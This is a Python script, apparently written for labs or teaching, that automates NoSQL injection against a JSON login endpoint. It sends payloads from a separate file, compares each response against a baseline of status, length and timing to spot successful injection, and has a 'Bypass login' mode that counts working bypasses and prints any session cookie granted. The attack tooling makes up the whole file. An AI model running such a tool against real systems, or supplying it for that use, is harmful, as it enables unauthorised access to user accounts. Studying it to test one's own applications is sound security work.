import sys
import os
import requests
import json 

username        = "admin"
session_cookie  = ""   
payloads_file   = "payload.json"

# Baselines for differential analysis
baseline_length = 0
baseline_status = 0
baseline_time   = 0.0 # Tracks normal response time

def load_payloads():
    try:
        with open(payloads_file, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        log(f"Error: Could not find '{payloads_file}'.", 2)
        sys.exit(1)
    except json.JSONDecodeError:
        log(f"Error: '{payloads_file}' is not formatted correctly.", 2)
        sys.exit(1)

def print_options():
    clear_terminal()
    print(
f"""\033[94m[1]\033[0m Set target username (Current: '{username}')
\033[94m[2]\033[0m Set Session Cookie (Current: '{session_cookie}')
-------------------------------
\033[92m[3]\033[0m Test all payloads for vulnerability  
\033[92m[4]\033[0m Bypass login         
---------------------        
\033[94m[0]\033[0m Exit
?""")

def main():
    global username, session_cookie
    print_options()
    try:
        choice = input()
        if choice == "1":
            log("Enter username", 3)
            username = input()
        elif choice == "2":
            log("Enter Session Cookie value", 3)
            session_cookie = input()
        elif choice == "3":
            choice_test_vulnerability()
        elif choice == "4":
            choice_authenticate()
        elif choice == "0":
            log("Exiting...", 3)
            sys.exit(0)
            return
        main()
    except KeyboardInterrupt:
        sys.exit(0)

def choice_test_vulnerability():
    clear_terminal()
    log("Running full vulnerability scan...")
    log(f"Target: '{url}'", 3)
    test_vulnerability()
    await_input()

def choice_authenticate():
    clear_terminal()
    log("Attempting to bypass login...")
    log(f"Target: '{url}'", 3)
    set_baseline()
    authenticate()
    await_input()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def await_input():
    log("Press Enter to get back to main menu", 3)
    input()

def log(string, type=1):
    if type == 1: print(f'\033[92m[+]\033[0m {string}')
    elif type == 2: print(f'\033[93m[-]\033[0m {string}')
    elif type == 3: print(f'\033[94m[!]\033[0m {string}')

def print_attack_breakdown(payload_name, payload, response, reason):
    """Prints a detailed educational breakdown of why the injection worked."""
    print("\n\033[93m" + "="*60 + "\033[0m")
    print(f"\033[92m[i] INJECTION SUCCESS: {payload_name.upper()}\033[0m")
    print("\033[93m" + "="*60 + "\033[0m")
    print("\n\033[94m1. WHAT WAS INJECTED:\033[0m")
    print(f"\033[90m{json.dumps(payload, indent=2)}\033[0m")
    print("\n\033[94m2. HOW WE DETECTED IT:\033[0m")
    print(f"* \033[1mDetection Method:\033[0m {reason}")
    print(f"* \033[1mNormal Status:\033[0m {baseline_status} -> \033[1mNew Status:\033[0m {response.status_code}")
    print(f"* \033[1mNormal Time:\033[0m {round(baseline_time, 2)}s -> \033[1mNew Time:\033[0m {round(response.elapsed.total_seconds(), 2)}s")
    if response.cookies.get_dict():
        print(f"* \033[1mSession Cookie Granted:\033[0m \033[92m{response.cookies.get_dict()}\033[0m")
    print("\033[93m" + "="*60 + "\033[0m\n")

def send_json_post(payload):
    cookies = {'session': session_cookie} if session_cookie else None
    try:
        return requests.post(
            url,
            json=payload,
            cookies=cookies,
            allow_redirects=False, 
            timeout=15 
        )
    except Exception as e:
        log(f"Connection error: {e}", 2)
        return None

def set_baseline():
    global baseline_length, baseline_status, baseline_time
    payloads_data = load_payloads()
    payload_bogus = payloads_data.get("baseline_payload")
    
    response = send_json_post(payload_bogus)
    if response:
        baseline_status = response.status_code
        baseline_length = len(response.text)
        baseline_time = response.elapsed.total_seconds()
        log(f"Baseline established: Status {baseline_status}, Length {baseline_length}, Time {round(baseline_time, 2)}s")

def check_success(response):
    """Returns (True, Reason) if successful, or (False, None) if failed."""
    if not response:
        return False, None
        
    # 1. TIME-BASED CHECK: Did it take 3 seconds longer than normal?
    if response.elapsed.total_seconds() > (baseline_time + 3.0):
        return True, "Time-Based Delay (Server slept for several seconds)"
        
    # 2. STATUS CHECK: Did we get a 302 Redirect instead of a 401/200?
    if response.status_code != baseline_status:
        return True, "Status Code Changed (Likely bypassed login)"
        
    # 3. LENGTH CHECK: Did the HTML page size change significantly?
    if abs(len(response.text) - baseline_length) > 20:
        return True, "Response Length Changed (Likely viewing a different page)"
        
    return False, None

def test_vulnerability():
    set_baseline()
    payloads_data = load_payloads()

    found_vulnerability = False

    # Loop through every payload in the JSON file
    for payload_name, payload in payloads_data.items():
        if payload_name == "baseline_payload":
            continue # Skip the baseline, we already sent it
            
        log(f"Testing payload: {payload_name}...", 3)
        response = send_json_post(payload)
        
        # --- NEW CODE: Print Status and Length for every request ---
        if response:
            print(f"    --> Response Status: {response.status_code}")
            print(f"    --> Response Length: {len(response.text)} bytes")
        else:
            print(f"    --> No response received.")
        # -----------------------------------------------------------

        is_success, reason = check_success(response)

        if is_success:
            log(f"✅ VULNERABILITY FOUND via {payload_name}!")
            print_attack_breakdown(payload_name, payload, response, reason)
            found_vulnerability = True

    if not found_vulnerability:
        log("Scan complete. No vulnerabilities detected with current payloads.", 2)

def authenticate():
    set_baseline()
    payloads_data = load_payloads()
    
    # NEW: Track how many payloads successfully bypassed the login
    bypasses_found = 0 

    for payload_name, payload in payloads_data.items():
        if payload_name == "baseline_payload":
            continue
            
        log(f"Attempting login bypass with: {payload_name}...", 3)
        response = send_json_post(payload)
        
        # --- Print Status and Length for every request ---
        if response:
            print(f"    --> Response Status: {response.status_code}")
            print(f"    --> Response Length: {len(response.text)} bytes")
        else:
            print(f"    --> No response received.")
        # -----------------------------------------------------------

        is_success, reason = check_success(response)

        # For authentication bypass, we only care if we got redirected or content changed.
        if is_success and "Time-Based" not in reason:
            log(f"✅ Authentication bypassed successfully using {payload_name}!")
            print_attack_breakdown(payload_name, payload, response, reason)
            bypasses_found += 1 
            # REMOVED the 'return' statement here so the loop continues!
            
    # Check our tracker at the very end
    if bypasses_found == 0:
        log("Could not bypass authentication with any payload.", 2)
    else:
        log(f"Scan complete. Found {bypasses_found} successful bypass payloads!", 1)

if __name__ == "__main__":
    global url
    if len(sys.argv) < 2:
        print("\nTarget URL not supplied.")
        print("Usage: python nosql_test.py http://localhost:5000/login")
        sys.exit(1)
    url = sys.argv[1]
    main()
    